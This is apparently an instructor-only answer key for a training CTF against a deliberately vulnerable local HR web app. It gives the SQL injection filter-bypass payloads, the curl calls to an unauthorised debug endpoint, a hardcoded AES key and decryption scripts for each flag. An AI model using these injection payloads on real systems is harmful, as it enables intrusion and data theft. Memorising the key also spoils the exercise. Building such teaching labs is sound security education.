# CTF 3 -- Solutions

> **Instructors/markers only.** Do not distribute to participants.

---

## Credentials

- See `credentials.json` for generated per-user passwords.
- Usernames follow the `abcd12` format (4 letters + 2 digits).
- Generate credentials with: `cd CTFs/challenge-generation && node chgen_ctf3.js abcd12 efgh34`

---

## Flag Location

Each user has two types of flags stored in `flags.json`:
- `flag_api` -- returned by the `/api/flag` endpoint and shown on the `/flag` page
- `flag_decrypt` -- encrypted with AES-256-CBC, placed in the user's bot employee notes

Flag format: `durham-hr{<token>_<username>}`

---

## Overview

The HR System CTF includes:

- A login page (`/login`)
- A dashboard and employee directory
- A hidden `/flag` page (discoverable via path traversal hint)
- A debug API endpoint that leaks credentials
- Per-user bot employees with encrypted flag notes (discoverable via SQL injection)

To solve the CTF, students exploit multiple vulnerabilities to collect 3 per-user flags.

---

## Flag 1: Path Traversal (Per-User)

### Steps

1. Login at http://localhost:5174 with credentials from `credentials.json`
2. Inspect Dashboard page source (Ctrl+U or View Source)
3. Find HTML comment: `<!-- TODO: Fix broken admin link - /admin/../../flag should redirect properly -->`
4. Navigate to: `http://localhost:5174/flag`
5. The page fetches the flag from the backend API `/api/flag` using the player's JWT

**Flag:** `durham-hr{..._<username>}` (per-user, from `flags.json` `flag_api`)

---

## Flag 2: SQL Injection + Source Code Key + Decryption (Per-User)

This flag requires chaining three vulnerabilities together.

### Step 1: Discover the encryption key

1. Open DevTools (F12) -> Sources tab
2. Navigate to: `src/utils/legacyAuth.ts`
3. Find key in comments: `CTF_2026_SECRET_KEY_XJ9K2L`

### Step 2: SQL injection to find hidden bot employee

The employee search filters basic injection like `' OR 1=1--` but misses no-space variants.

**Blocked:** `' OR 1=1--` (space after quote)

**Working Payloads:**
- `'OR 1=1--` (no space after quote)
- `'/**/OR/**/1=1--` (comment-based)

1. Go to Employees page
2. Enter payload in search: `'OR 1=1--`
3. Returns all employees including the hidden bot employees (e.g., `BOT001`):

```json
{
  "employee_id": "BOT001",
  "notes": "AES-256-CBC encrypted data: <iv>:<ciphertext> (hint: check legacy code for the key)"
}
```

Each player has their own bot employee (`<username>-bot`) with their own encrypted flag.

### Step 3: Get encrypted data via debug endpoint

**Hint in:** `frontend/src/api/client.ts` shows debug endpoint

```bash
# Get token
TOKEN=$(curl -s -X POST http://127.0.0.1:8004/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"abcd12","password":"<password>"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# Query debug endpoint for your bot
curl "http://127.0.0.1:8004/api/debug/config?user=abcd12-bot" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{
  "user": "abcd12-bot",
  "config": {
    "notes": "AES-256-CBC encrypted data: <iv>:<ciphertext> (hint: check legacy code for the key)",
    "owner": "abcd12"
  }
}
```

### Step 4: Decrypt the flag

**Node.js:**
```javascript
const crypto = require('crypto');

const encrypted = '<iv_base64>:<ciphertext_base64>';  // from bot notes
const key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L';

const [ivBase64, ciphertext] = encrypted.split(':');
const key = crypto.createHash('sha256').update(key_passphrase).digest();
const iv = Buffer.from(ivBase64, 'base64');
const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);

let decrypted = decipher.update(ciphertext, 'base64', 'utf8');
decrypted += decipher.final('utf8');
console.log(decrypted);
```

**Python:**
```python
from Crypto.Cipher import AES
import hashlib, base64

encrypted = '<iv_base64>:<ciphertext_base64>'  # from bot notes
key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'

iv_b64, ciphertext = encrypted.split(':')
key = hashlib.sha256(key_passphrase.encode()).digest()
iv = base64.b64decode(iv_b64)
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(base64.b64decode(ciphertext))

# Remove PKCS7 padding
pad_len = decrypted[-1]
decrypted = decrypted[:-pad_len].decode('utf-8')
print(decrypted)
```

**Flag:** `durham-hr{..._<username>}` (per-user, from `flags.json` `flag_decrypt`)

---

## Flag 3: API Flag Endpoint (Per-User)

```bash
curl "http://127.0.0.1:8004/api/flag" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{
  "flag": "durham-hr{..._<username>}"
}
```

**Flag:** Same as Flag 1 (`flag_api` value from `flags.json`)

---

## Vulnerabilities Exploited

| Vulnerability | Location | Description |
|---------------|----------|-------------|
| Path traversal hint | Dashboard HTML source | Comment reveals hidden `/flag` route |
| Information disclosure | `legacyAuth.ts` | Encryption key in frontend source code |
| SQL injection | `EmployeeController::index()` | Bypassable filter using no-space technique |
| Debug API leak | `DebugController::getUserConfig()` | Returns raw credentials without proper authorization |
| Insecure encryption | Bot employee notes | AES-256-CBC with key discoverable in source |

---

## Reset

```bash
docker compose down -v && docker compose up --build
```

This re-runs migrations and re-seeds from the mounted `flags.json` and `credentials.json`.
